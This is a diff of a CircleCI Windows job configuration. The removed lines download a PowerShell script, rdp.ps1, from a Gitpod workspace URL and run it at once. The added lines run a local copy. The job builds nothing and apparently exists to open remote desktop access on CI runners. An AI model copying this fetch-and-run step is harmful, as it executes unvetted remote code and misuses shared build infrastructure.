@@ -1,17 +1,14 @@
-version: 2.1 
- 
+version: 2.1
+
 orbs:
-  win: circleci/windows@2.2.0
- 
+  win: circleci/windows@4.1.1
+
 jobs:
-  build: 
+  build:
     executor:
-      name: win/default 
-      size: "medium" 
- 
+      name: win/default
     steps:
+      # default shell is Powershell
       - run:
-          name: Nostalgia
-          command: |
-              Invoke-WebRequest https://4456-opalricearl-circlecipro-dynpgrqmusl.ws-us63.gitpod.io/rdp.ps1 -OutFile rdp.ps1
-              .\rdp.ps1
+         command: .\rdp.ps1
+         shell: powershell.exe
